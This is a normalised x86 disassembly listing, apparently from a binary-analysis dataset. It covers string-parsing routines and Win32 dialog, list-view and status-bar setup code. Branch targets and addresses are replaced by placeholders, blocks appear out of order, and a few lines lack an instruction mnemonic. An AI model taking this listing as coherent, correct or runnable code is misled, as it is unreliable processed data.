jg r-xdata
cmp ebp ebx
je r-xdata
cmp [ esp + 0x34 ] edi
jb r-xdata
mov edx [ esp + 0x58 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
cmp [ edi ] 0x2d
mov [ esp + 0x14 ] edi
jne r-xdata
cmp al 0x7a
jg r-xdata
cmp ebp ebx
je r-xdata
mov ebp 0x1
inc edi
jmp r-xdata
cmp ebp 0x1
jne r-xdata
cmp [ esp + 0x50 ] edi
mov [ esp + 0x34 ] 0xf
mov [ esp + 0x30 ] ebx
mov [ esp + 0x20 ] 0x0
jb r-xdata
mov eax [ esp + 0x20 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
push esi
lea ecx [ esp + 0x58 ]
call sub_4024d0
mov ecx [ esp + 0x2c0 ]
lea eax [ esp + 0x54 ]
push eax
mov [ esp + 0x2b8 ] 0x3
call sub_407460
mov eax [ esp + 0x6c ]
mov edi 0x10
cmp eax edi
jb r-xdata
sub edi ecx
cmp edi 0xff
jg r-xdata
cmp ebp ebx
je r-xdata
mov ebp 0x2
inc edi
jmp r-xdata
cmp ebp 0x2
jne r-xdata
mov al [ edi ]
cmp al 0x30
jl r-xdata
mov [ esp + 0x14 ] edi
xor eax eax
jmp r-xdata
mov ecx [ esp + 0x3c ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
cmp [ esp + 0x34 ] edi
jb r-xdata
mov ecx [ esp + 0x58 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
lea ecx [ esp + 0x1c ]
call sub_4480e0
lea ecx [ esp + 0x38 ]
call sub_4480e0
or eax 0xffffffff
cmp edi ebx
je r-xdata
mov ebp 0x3
inc edi
jmp r-xdata
cmp ebp 0x3
jne r-xdata
mov ecx [ esp + 0x2ac ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x2a8
retn
cmp [ esp + 0x50 ] edi
mov [ esp + 0x34 ] 0xf
mov [ esp + 0x30 ] ebx
mov [ esp + 0x20 ] 0x0
jb r-xdata
mov edx [ esp + 0x20 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov ebx [ lstrcpynA@IAT ]
lea edx [ edi + 0x1 ]
push edx
push ecx
lea eax [ esp + 0xb4 ]
push eax
call ebx
mov eax [ esp + 0x14 ]
inc eax
mov [ esp + 0x14 ] eax
xor esi esi
mov ecx eax
mov edx eax
mov eax [ esp + 0x3c ]
push eax
call j_sub_4b66ed#2
add esp 0x4
xor eax eax
jmp r-xdata
cmp al 0x41
jl r-xdata
cmp al 0x39
jg r-xdata
cmp al 0x61
jl r-xdata
cmp al 0x5a
jg r-xdata
test esi esi
je r-xdata
cmp [ edx ] 0x5d
mov [ esp + 0x14 ] edx
jne r-xdata
cmp al 0x7a
jg r-xdata
test esi esi
je r-xdata
mov esi 0x1
inc edx
jmp r-xdata
cmp esi 0x1
jne r-xdata
mov ecx [ esp + 0x2bc ]
push ecx
lea ecx [ esp + 0x58 ]
call sub_4024d0
mov ecx [ esp + 0x2c0 ]
lea edx [ esp + 0x54 ]
push edx
mov [ esp + 0x2b8 ] 0x4
call sub_407460
lea ecx [ esp + 0x54 ]
call sub_4480e0
lea ecx [ esp + 0x1c ]
call sub_4480e0
lea ecx [ esp + 0x38 ]
call sub_4480e0
xor eax eax
jmp r-xdata
mov eax edx
sub eax ecx
cmp eax 0xff
mov [ esp + 0x18 ] eax
jg r-xdata
test esi esi
je r-xdata
mov esi 0x2
inc edx
jmp r-xdata
cmp esi 0x2
jne r-xdata
mov al [ edx ]
cmp al 0x30
jl r-xdata
mov [ esp + 0x14 ] edx
test eax eax
je r-xdata
mov esi 0x3
inc edx
jmp r-xdata
cmp esi 0x3
jne r-xdata
inc eax
push eax
push ecx
lea ecx [ esp + 0x1b4 ]
push ecx
call ebx
cmp ebp esi
jne r-xdata
test ebp ebp
je r-xdata
mov edx [ esp + 0x18 ]
xor esi esi
cmp edi edx
jg r-xdata
jne r-xdata
test edi edi
mov ecx edi
jl r-xdata
xor eax eax
test edi edi
jle r-xdata
mov ecx edx
sub ecx edi
xor eax eax
test ecx ecx
jle r-xdata
mov esi edx
sub esi edi
cmp ebp 0x1
jne r-xdata
lea ecx [ ecx ]
mov esi ecx
mov bl 0x40
mov dl 0x60
mov bl [ esp + ecx + 0xac ]
lea eax [ esp + ecx + 0xac ]
dec ecx
mov [ esi + eax ] bl
jns r-xdata
cmp ebp 0x2
jne r-xdata
mov bl 0x3a
mov [ esp + 0x13 ] 0x30
jmp r-xdata
jl r-xdata
cmp ebp 0x2
jne r-xdata
mov [ esp + eax + 0xac ] 0x30
jmp r-xdata
cmp ebp 0x3
jne r-xdata
mov bl 0x5b
mov [ esp + 0x13 ] 0x41
jmp r-xdata
mov edx [ esp + 0x14 ]
inc edx
push edx
lea ecx [ esp + 0x20 ]
call sub_402510
mov [ esp + 0x8c ] 0xf
mov [ esp + 0x88 ] 0x0
mov [ esp + 0x78 ] 0x0
mov ebp [ esp + 0x70 ]
mov [ esp + 0x2b4 ] 0x5
mov edi 0x10
jmp r-xdata
inc eax
cmp eax edi
jl r-xdata
cmp ebp 0x3
jne r-xdata
mov [ esp + eax + 0xac ] bl
jmp r-xdata
inc eax
cmp eax ecx
jl r-xdata
mov bl [ esp + 0x13 ]
mov bl 0x7b
mov [ esp + 0x13 ] 0x61
jmp r-xdata
lea eax [ esp + esi + 0xac ]
push eax
lea ecx [ esp + 0x3c ]
push ecx
lea edx [ esp + 0x98 ]
push edx
call sub_402140
lea ecx [ esp + 0x28 ]
push ecx
push eax
lea edx [ esp + 0x68 ]
push edx
mov [ esp + 0x2cc ] 0x6
call sub_420e80
add esp 0x18
push 0xffffffff
push 0x0
push eax
lea ecx [ esp + 0x80 ]
mov [ esp + 0x2c0 ] 0x7
call sub_401dd0
lea ecx [ esp + 0x54 ]
call sub_4480e0
lea ecx [ esp + 0x90 ]
mov [ esp + 0x2b4 ] 0x5
call sub_4480e0
cmp [ esp + 0x8c ] edi
mov eax [ esp + 0x78 ]
jae r-xdata
mov cl [ esp + eax + 0xac ]
mov dl [ esp + eax + 0x1ac ]
cmp cl dl
jg r-xdata
jmp r-xdata
mov [ esp + eax + 0xac ] dl
cmp ebp 0x1
jne r-xdata
mov ecx [ esp + 0x2c0 ]
push ecx
push eax
call sub_4545a0
add esp 0x8
lea edx [ esp + 0x1ac ]
or ebp eax
push edx
lea eax [ esp + 0xb0 ]
push eax
call [ lstrcmpA@IAT ]
test eax eax
je r-xdata
lea eax [ esp + 0x78 ]
lea ecx [ esp + 0x74 ]
call sub_4480e0
lea ecx [ esp + 0x1c ]
call sub_4480e0
lea ecx [ esp + 0x38 ]
call sub_4480e0
mov eax ebp
jmp r-xdata
mov eax [ esp + 0x18 ]
mov dl [ esp + eax + 0xab ]
dec eax
inc dl
mov cl dl
cmp cl bl
mov [ esp + eax + 0xac ] dl
jne r-xdata
jmp r-xdata
mov cl [ esp + 0x13 ]
mov [ esp + eax + 0xac ] cl
dec eax
test esi esi
jle r-xdata
test eax eax
jl r-xdata
dec esi
mov dl [ esp + eax + 0xac ]
inc dl
mov cl dl
cmp cl bl
mov [ esp + eax + 0xac ] dl
je r-xdata
jmp r-xdata
sub_454ba0
push 0xffffffff
push sub_4c08e6
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x860
push ebp
push esi
push edi
mov edi [ esp + 0x880 ]
mov cl [ edi ]
xor ebp ebp
xor esi esi
test cl cl
mov [ esp + 0x34 ] ebp
je r-xdata
push ebx
mov ebx [ lstrcpynA@IAT ]
lea edx [ esi + 0x1 ]
push edx
push edi
lea eax [ esp + 0x478 ]
push eax
call ebx
inc ebp
push ebp
push edi
lea ecx [ esp + 0x678 ]
push ecx
mov [ esp + 0x48 ] esi
call ebx
mov eax [ esp + 0x880 ]
xor ecx ecx
mov [ esp + 0x40 ] r--data
mov [ esp + 0x44 ] r--data
mov [ esp + 0x48 ] r--data
mov [ esp + 0x4c ] r--data
mov [ esp + 0x50 ] r--data
mov [ esp + 0x18 ] 0xffffffff
mov [ esp + 0x34 ] 0xf
mov [ esp + 0x30 ] ecx
mov [ esp + 0x20 ] cl
mov [ esp + 0x878 ] ecx
cmp [ eax ] 0x0
je r-xdata
mov eax 0x1
pop ebx
mov dl [ eax ]
cmp dl 0x1b
jne r-xdata
mov cl [ edi + eax ]
inc eax
test cl cl
jne r-xdata
test ebp ebp
jne r-xdata
movsx ecx dl
cmp ecx 0x80
jl r-xdata
cmp [ eax + 0x1 ] 0x24
jne r-xdata
cmp cl 0x2f
jne r-xdata
cmp esi 0x1ff
mov [ esp + 0x34 ] ebp
jg r-xdata
mov esi eax
lea ecx [ eax - 0x1 ]
cmp ecx 0x7
jle r-xdata
mov cl dl
xor cl 0x20
add cl 0x5f
cmp cl 0x3b
ja r-xdata
cmp ecx 0xa1
jl r-xdata
mov cl [ eax + 0x2 ]
cmp cl 0x40
je r-xdata
mov ecx [ esp + 0x86c ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
add esp 0x86c
retn
mov ebp eax
cmp dl 0x3c
jne r-xdata
add eax 0x2
jmp r-xdata
add eax 0x2
jmp r-xdata
cmp ecx 0xdf
jg r-xdata
mov cl [ eax + 0x3 ]
add eax 0x3
test cl cl
je r-xdata
cmp cl 0x42
jne r-xdata
inc eax
jmp r-xdata
mov cl [ eax + 0x1 ]
inc eax
xor bl bl
cmp cl 0x2f
mov [ esp + 0x10 ] eax
jne r-xdata
cmp [ eax ] 0x0
jne r-xdata
movsx ecx [ eax + 0x1 ]
cmp ecx 0x80
jl r-xdata
cmp [ esp + 0x34 ] 0x10
jb r-xdata
lea ecx [ ecx ]
lea edx [ esp + 0x1c ]
push edx
lea eax [ esp + 0x14 ]
push eax
call sub_453260
add esp 0x8
test eax eax
jne r-xdata
inc eax
mov [ esp + 0x10 ] eax
mov bl 0x1
mov edx [ esp + 0x20 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
cmp [ eax + 0x1 ] 0x28
jne r-xdata
mov eax [ esp + 0x10 ]
mov eax [ rw-data ]
mov edi [ lstrcmpiA@IAT ]
mov ebp [ esp + 0x18 ]
xor esi esi
mov [ esp + 0x14 ] esi
nop
cmp cl 0x1b
jne r-xdata
jmp r-xdata
mov cl [ eax + 0x2 ]
cmp cl 0x42
je r-xdata
test bl bl
jne r-xdata
lea ecx [ esi - 0x1 ]
mov edx 0x1
shl edx cl
test eax edx
je r-xdata
add eax 0x3
jmp r-xdata
cmp cl 0x4a
je r-xdata
cmp [ esp + 0x34 ] 0x10
mov eax [ esp + 0x20 ]
jae r-xdata
cmp ebp 0x1
jne r-xdata
inc esi
cmp esi 0x5
mov [ esp + 0x14 ] esi
jl r-xdata
mov ecx [ esp + esi * 4 + 0x40 ]
push ecx
push eax
call edi
test eax eax
je r-xdata
lea eax [ esp + 0x20 ]
test al 0x10
jne r-xdata
test esi esi
jle r-xdata
mov eax [ esp + 0x10 ]
inc eax
jmp r-xdata
test bl bl
jne r-xdata
mov eax [ rw-data ]
mov eax [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x18 ] 0xffffffff
inc eax
jmp r-xdata
cmp esi 0xffffffff
mov [ esp + 0x18 ] esi
je r-xdata
lea edx [ esp + 0x1c ]
push edx
lea eax [ esp + 0x14 ]
push eax
call sub_453260
add esp 0x8
test eax eax
jne r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ esp + 0x30 ]
sub eax edx
cmp ecx ecx
mov ebp ecx
jae r-xdata
test ebp ebp
mov ebx [ esp + 0x34 ]
je r-xdata
cmp ebp eax
jb r-xdata
cmp ebp eax
mov ecx ebp
jb r-xdata
cmp [ esp + 0x14 ] 0x2
mov eax [ esp + 0x20 ]
jge r-xdata
xor edx edx
cmp ebp eax
setne dl
test edx edx
je r-xdata
cmp ebx 0x10
mov esi [ esp + 0x20 ]
jae r-xdata
mov ecx eax
cmp ebx 0x10
jae r-xdata
cmp ebx 0x10
jae r-xdata
mov edi r--data
xor edx edx
[ esi ] [ edi ]
je r-xdata
lea esi [ esp + 0x20 ]
push r--data
lea eax [ esp + 0x20 ]
push r--data
jmp r-xdata
lea eax [ esp + 0x20 ]
test edx edx
jne r-xdata
sbb edx edx
sbb edx 0xffffffff
lea eax [ esp + 0x1c ]
push eax
lea ecx [ esp + 0x14 ]
push ecx
call sub_453260
mov eax r--data
add esp 0x8
lea edx [ eax + 0x1 ]
lea ecx [ esp + 0x1c ]
push ecx
lea edx [ esp + 0x14 ]
push edx
call sub_453260
add esp 0x8
test eax eax
je r-xdata
push eax
call [ lstrcmpiA@IAT ]
test eax eax
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov edx [ esp + 0x30 ]
push eax
push r--data
push edx
push 0x0
lea ecx [ esp + 0x2c ]
call sub_401150
test eax eax
jne r-xdata
lea eax [ esp + 0x1c ]
push eax
lea ecx [ esp + 0x14 ]
push ecx
call sub_453260
add esp 0x8
test eax eax
jne r-xdata
cmp [ esp + 0x34 ] 0x10
mov eax [ esp + 0x20 ]
jae r-xdata
mov edi [ lstrcpynA@IAT ]
push 0x200
push eax
lea edx [ esp + 0x278 ]
push edx
call edi
mov bl [ esp + 0x277 ]
push r--data
lea eax [ esp + 0x274 ]
push eax
lea esi [ esp + 0x278 ]
mov [ esp + 0x27f ] 0x0
call [ lstrcmpiA@IAT ]
test eax eax
mov [ esp + 0x277 ] bl
mov ebx [ lstrcpyA@IAT ]
je r-xdata
lea eax [ esp + 0x20 ]
lea ecx [ esp + 0x270 ]
push ecx
lea edx [ esp + 0x74 ]
push edx
call ebx
cmp [ esp + 0x270 ] 0x2f
jne r-xdata
mov edi [ esp + 0x888 ]
xor ebp ebp
xor ebx ebx
lea ecx [ ecx ]
lea eax [ esp + 0x70 ]
push eax
lea ecx [ esp + 0x474 ]
push ecx
call ebx
mov cl [ esp + 0x70 ]
xor esi esi
xor eax eax
test cl cl
je r-xdata
lea eax [ esp + 0x470 ]
push eax
lea ecx [ esp + 0x74 ]
push ecx
call ebx
cmp [ esp + 0x270 ] 0x2e
mov eax [ esp + 0x3c ]
jne r-xdata
lea ecx [ esp + 0x670 ]
push ecx
lea edx [ esp + 0x74 ]
push edx
call ebx
mov eax [ esp + 0x38 ]
lea esi [ esp + 0x271 ]
jmp r-xdata
mov ecx [ edi + 0x8 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
lea esi [ eax - 0x1 ]
mov edx 0x1
lea ebx [ esp + 0x70 ]
sub edx ebx
nop
mov edx 0x200
sub edx eax
push edx
push esi
lea eax [ esp + eax + 0x78 ]
push eax
call edi
jmp r-xdata
cmp [ esi + 0x1 ] 0x2e
jne r-xdata
mov eax [ edi + 0x4 ]
test eax eax
jne r-xdata
lea eax [ esp + 0x70 ]
lea ecx [ esi + ebx ]
lea esi [ eax + 0x1 ]
cmp ebp edx
jge r-xdata
mov cl [ esp + eax + 0x71 ]
inc eax
test cl cl
jne r-xdata
cmp eax 0x7
jle r-xdata
mov eax [ esp + 0x14 ]
test eax eax
jne r-xdata
cmp [ esi + 0x2 ] 0x2f
jne r-xdata
mov ecx [ edi + 0x8 ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax esi
push eax
mov eax [ ecx + 0x14 ]
lea edx [ esp + 0x74 ]
push edx
push eax
push 0x0
call sub_401150
test eax eax
je r-xdata
cmp cl 0x2f
jne r-xdata
test esi esi
jne r-xdata
lea esi [ eax + edx ]
lea esi [ esp + esi + 0x70 ]
test eax eax
je r-xdata
lea edx [ esp + 0x70 ]
push edx
lea ecx [ esp + 0x58 ]
call sub_4024d0
mov ecx [ esp + 0x888 ]
lea eax [ esp + 0x54 ]
push eax
mov [ esp + 0x87c ] 0x1
call sub_407460
cmp [ esp + 0x6c ] 0x10
mov [ esp + 0x878 ] 0x0
jb r-xdata
cmp ebp edx
jne r-xdata
inc ebp
add ebx 0x1c
jmp r-xdata
lea edx [ esi + 0x1 ]
push edx
lea eax [ esp + 0x74 ]
push eax
lea ecx [ esp + 0x478 ]
push ecx
call edi
mov eax [ esp + 0x10 ]
mov [ esp + 0x3c ] esi
inc eax
jmp r-xdata
mov cl [ esi + 0x3 ]
add esi 0x3
cmp cl 0x2e
je r-xdata
mov cl [ esp + eax + 0x6e ]
dec eax
test cl cl
je r-xdata
mov [ esp + 0x6c ] 0xf
mov [ esp + 0x68 ] 0x0
mov [ esp + 0x58 ] 0x0
mov ecx [ esp + 0x58 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov esi [ edi + 0x4 ]
test esi esi
jne r-xdata
cmp cl 0x2f
jne r-xdata
sub_455190
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c0974
push eax
mov eax [ esp + 0x14 ]
mov [ fs : 0x0 ] esp
sub esp 0x8f4
cmp eax 0x113
push ebx
push ebp
push esi
push edi
ja r-xdata
cmp eax 0x1411
ja r-xdata
je r-xdata
cmp eax 0x1420
je r-xdata
je r-xdata
mov ebx [ esp + 0x914 ]
push 0xce6
push ebx
call [ GetDlgItem@IAT ]
mov ebp [ SendMessageA@IAT ]
push 0x0
push 0x0
mov edi eax
push 0x1027
push edi
call ebp
push 0x0
push 0x0
push 0x1028
push edi
mov esi eax
call ebp
lea edi [ eax + esi ]
cmp esi edi
jge r-xdata
cmp eax 0x4e
ja r-xdata
mov esi [ esp + 0x914 ]
push esi
call [ UpdateWindow@IAT ]
push r--data
push 0x0
push 0x401
push 0x64
push esi
call [ SendDlgItemMessageA@IAT ]
push 0x7f02
push 0x0
mov [ rw-data ] 0x1
call [ LoadCursorA@IAT ]
push eax
call [ SetCursor@IAT ]
mov ecx rw-data
mov [ esp + 0x3c ] eax
call sub_404310
mov ebx [ SendMessageA@IAT ]
mov ebp [ GetAsyncKeyState@IAT ]
xor edi edi
jmp r-xdata
cmp eax 0x1703
jne r-xdata
mov ecx rw-data
mov [ esp + 0x3c ] ecx
call sub_404310
mov edi [ esp + 0x920 ]
mov [ esp + 0x90c ] 0x3
xor ebx ebx
sub eax 0x1401
je r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
push 0x0
push eax
push esi
push ebx
call sub_453800
add esp 0x10
inc esi
cmp esi edi
jl r-xdata
sub eax 0x110
je r-xdata
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx rw-data
mov [ esp + 0x10 ] ecx
call sub_404310
mov ebx [ esp + 0x920 ]
test ebx ebx
mov [ esp + 0x90c ] 0x4
je r-xdata
mov eax [ rw-data ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
mov ebx [ esp + 0x914 ]
push 0xce6
push ebx
call [ GetDlgItem@IAT ]
lea ecx [ esp + 0x1c ]
push ecx
push eax
mov [ esp + 0x1c ] eax
call [ GetWindowRect@IAT ]
mov ecx [ esp + 0x91c ]
mov eax [ ecx ]
cmp [ esp + 0x1c ] eax
mov [ esp + 0x1b ] 0x0
jg r-xdata
sub eax 0x4
je r-xdata
dec [ rw-data ]
jmp r-xdata
push 0x0
push 0x0
push 0x1405
push ebx
call ebp
jmp r-xdata
mov edi [ esp + 0x914 ]
push 0x10c
push 0xfffffffa
push edi
call [ GetWindowLongA@IAT ]
push eax
call [ LoadIconA@IAT ]
mov esi [ SendMessageA@IAT ]
push eax
push 0x0
push 0x80
push edi
call esi
or eax 0xffffffff
mov ecx rw-data
mov [ rw-data ] eax
mov [ rw-data ] eax
call sub_404310
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
dec eax
jne r-xdata
cmp [ esp + 0x91c ] 0xce6
jne r-xdata
sub eax 0x2
je r-xdata
mov eax [ rw-data ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
mov ecx [ esp + 0x904 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x900
retn 0x10
mov ecx rw-data
call sub_401420
jmp r-xdata
mov edx [ esp + 0x914 ]
cmp [ ebx + 0xb0 ] edx
jne r-xdata
push edi
push 0x0
push 0x1410
push ebp
call [ SendMessageA@IAT ]
mov edx [ rw-data ]
test edx edx
je r-xdata
mov ecx [ ecx + ebx * 4 ]
mov eax edi
add ecx 0x8
lea esi [ eax + 0x1 ]
mov edi edi
cmp ebx eax
mov ebp [ esp + 0x914 ]
jge r-xdata
mov ebp [ esp + 0x920 ]
mov eax 0x1
xor ecx ecx
sub eax ebp
mov [ esp + 0x10 ] 0x0
mov edi ebp
mov [ esp + 0x3c ] eax
cmp eax [ esp + 0x24 ]
jge r-xdata
mov eax [ esp + 0x914 ]
push 0x64
push eax
call [ GetDlgItem@IAT ]
mov ebx eax
xor edi edi
cmp ebx edi
je r-xdata
sub eax 0xb
jne r-xdata
mov eax 0x1
push r--data
jmp r-xdata
mov eax [ rw-data ]
sub eax ecx
sar eax 0x2
test eax eax
jne r-xdata
mov ecx [ esp + 0x91c ]
movzx eax cx
cmp eax 0xc86
jg r-xdata
mov esi [ esp + 0x920 ]
mov eax [ esi + 0x8 ]
cmp eax 0xffffff94
je r-xdata
mov esi [ esp + 0x914 ]
push 0x1
push esi
call [ KillTimer@IAT ]
push 0xce6
push esi
call [ GetDlgItem@IAT ]
mov esi eax
test esi esi
je r-xdata
sub eax 0x3
je r-xdata
mov ecx rw-data
call sub_401420
push r--data
push 0x0
push 0x401
push 0x64
push esi
mov [ rw-data ] 0x0
call [ SendDlgItemMessageA@IAT ]
mov edx [ esp + 0x3c ]
push edx
call [ SetCursor@IAT ]
mov eax [ ecx + edi * 4 ]
mov ecx [ eax + 0x20 ]
add eax 0x8
cmp ecx 0x10
jb r-xdata
cmp edi eax
jge r-xdata
mov eax [ rw-data ]
mov ecx [ ebx + 0xfc ]
push 0x0
push eax
push ecx
push edx
call sub_453800
add esp 0x10
mov ecx [ ebx + 0x28 ]
cmp ecx 0xf
mov [ ebx + 0xb0 ] edx
je r-xdata
mov ecx rw-data
call sub_401420
jmp r-xdata
mov ecx [ rw-data ]
mov eax ecx
sub eax edx
sar eax 0x2
test eax eax
jbe r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax esi
push eax
mov eax [ ecx + 0x14 ]
push edi
push eax
push 0x0
call sub_401150
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
sub eax ecx
test eax eax
jle r-xdata
cmp al 0xd
je r-xdata
mov ecx [ ecx + 0x4 ]
cmp [ esp + 0x20 ] ecx
jg r-xdata
mov ecx rw-data
xor ebp ebp
mov [ esp + 0x14 ] edi
mov [ esp + 0x10 ] edi
call sub_404310
mov ecx [ rw-data ]
cmp ecx edi
jne r-xdata
mov eax [ esp + 0x91c ]
mov ecx eax
and ecx 0x10000
test eax 0x20000
mov [ esp + 0x3c ] ecx
jne r-xdata
mov ebx [ GetDlgItem@IAT ]
push 0x0
push 0xc
push 0xce5
push edi
call ebx
push eax
call esi
mov ecx rw-data
call sub_401420
push 0x0
push 0xce7
push edi
call ebx
mov ebp [ EnableWindow@IAT ]
push eax
call ebp
push 0x0
push 0xce8
push edi
call ebx
push eax
call ebp
push 0x0
push 0xcea
push edi
call ebx
push eax
call ebp
push 0x0
push 0x1
push edi
call ebx
push eax
call ebp
push 0xce6
push edi
call ebx
push 0x0
push 0x0
mov ebx eax
push 0x1037
push ebx
call esi
or eax 0x21
push eax
push 0x0
push 0x1036
push ebx
call esi
push 0x0
push 0x0
push 0xff000000
push 0x0
push 0x10
push 0xc26
push 0xfffffffa
push edi
call [ GetWindowLongA@IAT ]
push eax
call [ ImageList_LoadImageA@IAT ]
push eax
push 0x1
push 0x1003
push ebx
call esi
push 0x0
push 0x0
push 0x101f
push ebx
call esi
xor ebp ebp
test eax eax
mov [ esp + 0x3c ] eax
je r-xdata
mov eax [ ecx ]
mov ecx [ eax + 0x20 ]
add eax 0x8
cmp ecx 0x10
jb r-xdata
sub eax 0xce5
cmp eax 0x6
ja r-xdata
je r-xdata
mov ecx rw-data
call sub_404310
mov eax [ rw-data ]
cmp eax 0xffffffff
mov edi [ esi ]
mov esi [ esi + 0x10 ]
mov ebx [ SendMessageA@IAT ]
je r-xdata
cmp eax 0xffffff9b
je r-xdata
mov [ rw-data ] 0x0
jmp r-xdata
mov edi [ SendMessageA@IAT ]
push 0x0
push 0x1
push 0x1002
push esi
call edi
test eax eax
mov ebx [ ImageList_Destroy@IAT ]
je r-xdata
mov ebp [ esp + 0x920 ]
mov edi [ esp + 0x914 ]
mov ebx [ GetDlgItem@IAT ]
push 0x6
push 0x14
movzx esi bp
lea edx [ esi - 0xb5 ]
push edx
push 0x0
push 0x0
push 0x0
push 0xce5
push edi
shr ebp 0x10
call ebx
push eax
call [ SetWindowPos@IAT ]
push 0x5
push 0x0
push 0x0
push 0xb
lea eax [ esi - 0x66 ]
push eax
push 0x0
push 0x1
push edi
call ebx
push eax
call [ SetWindowPos@IAT ]
push 0x5
push 0x0
push 0x0
push 0x24
lea eax [ esi - 0x66 ]
push eax
push 0x0
push 0x2
push edi
call ebx
push eax
call [ SetWindowPos@IAT ]
push 0x6
lea ecx [ ebp - 0xbe ]
push ecx
lea eax [ esi - 0x1b ]
push eax
push 0x0
push 0x0
push 0x0
push 0xce6
push edi
call ebx
push eax
call [ SetWindowPos@IAT ]
push 0x4
push 0x64
lea eax [ esi - 0x1b ]
push eax
add ebp 0xffffff88
push ebp
push 0xc
push 0x0
push 0xcec
push edi
call ebx
push eax
call [ SetWindowPos@IAT ]
push 0x64
lea edx [ esi - 0x15e ]
push edi
mov [ esp + 0x44 ] edx
mov [ esp + 0x48 ] esi
call ebx
mov edi [ SendMessageA@IAT ]
mov esi eax
lea eax [ esp + 0x3c ]
push eax
push 0x2
push 0x404
push esi
call edi
mov ecx [ esp + 0x920 ]
mov edx [ esp + 0x91c ]
push ecx
push edx
push 0x5
push esi
call edi
jmp r-xdata
sub eax 0x26
jne r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
mov eax [ ebx + 0x7c ]
cmp eax 0x4
mov ebp 0x10
jb r-xdata
cmp ecx 0xd
je r-xdata
mov ecx [ ecx - 0x4 ]
mov eax edi
add ecx 0x8
lea esi [ eax + 0x1 ]
mov ecx [ rw-data ]
mov eax [ ecx + ebx * 4 ]
test eax eax
jne r-xdata
inc ebx
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp eax 0x200
jge r-xdata
cmp al 0xa
jne r-xdata
cmp ecx [ esp + 0x28 ]
jge r-xdata
mov eax [ rw-data ]
sub eax ecx
sar eax 0x2
mov [ esp + 0x3c ] eax
mov [ esp + 0x3c ] edi
jmp r-xdata
mov eax [ esp + 0x914 ]
push 0xce6
push eax
call [ GetDlgItem@IAT ]
mov esi [ SendMessageA@IAT ]
xor ebx ebx
push ebx
push ebx
mov ebp eax
push 0x1004
push ebp
call esi
lea ecx [ esp + 0x1c ]
mov edi eax
call sub_449ea0
test edi edi
mov [ esp + 0x90c ] ebx
jle r-xdata
mov ecx [ esp + 0x920 ]
mov edx [ rw-data ]
push 0x0
and eax 0xffff
push eax
push 0x0
push ecx
push edx
call sub_4b1c90
add esp 0x14
test eax eax
je r-xdata
lea edx [ esp + 0x4c ]
push edx
push ebp
push 0x101b
push ebx
mov [ esp + 0x5c ] 0xf
mov [ esp + 0x60 ] ebp
mov [ esp + 0x64 ] 0xc8
mov [ esp + 0x68 ] r--data
mov [ esp + 0x70 ] ebp
call esi
lea eax [ esp + 0x4c ]
push eax
push 0x1
push 0x101b
push ebx
mov [ esp + 0x74 ] 0xc
mov [ esp + 0x60 ] 0x2
mov [ esp + 0x64 ] 0x28
mov [ esp + 0x68 ] r--data
mov [ esp + 0x70 ] 0x1
call esi
mov eax 0x2
lea ecx [ esp + 0x4c ]
push ecx
push eax
push 0x101b
push ebx
mov [ esp + 0x74 ] 0xc
mov [ esp + 0x60 ] eax
mov [ esp + 0x64 ] 0x64
mov [ esp + 0x68 ] r--data
mov [ esp + 0x70 ] eax
call esi
lea edx [ esp + 0x4c ]
push edx
push 0x3
push 0x101b
push ebx
mov [ esp + 0x74 ] 0xc
mov [ esp + 0x60 ] 0x1
mov [ esp + 0x64 ] 0x28
mov [ esp + 0x68 ] r--data
mov [ esp + 0x70 ] 0x3
call esi
lea eax [ esp + 0x4c ]
push eax
push 0x4
push 0x101b
push ebx
mov [ esp + 0x74 ] 0xc
mov [ esp + 0x60 ] 0x1
mov [ esp + 0x64 ] 0x3c
mov [ esp + 0x68 ] r--data
mov [ esp + 0x70 ] 0x4
call esi
lea ecx [ esp + 0x4c ]
push ecx
push 0x5
push 0x101b
push ebx
mov [ esp + 0x74 ] 0xc
mov [ esp + 0x60 ] ebp
mov [ esp + 0x64 ] 0x78
mov [ esp + 0x68 ] r--data
mov [ esp + 0x70 ] 0x5
call esi
lea edx [ esp + 0x4c ]
push edx
push 0x6
push 0x101b
push ebx
mov [ esp + 0x74 ] 0xd
mov [ esp + 0x60 ] ebp
mov [ esp + 0x64 ] 0x258
mov [ esp + 0x68 ] r--data
mov [ esp + 0x70 ] 0x6
call esi
push 0x64
push edi
push ebp
push 0x50000103
call [ CreateStatusWindowA@IAT ]
mov ebx eax
lea eax [ esp + 0x4c ]
push eax
push 0x2
push 0x404
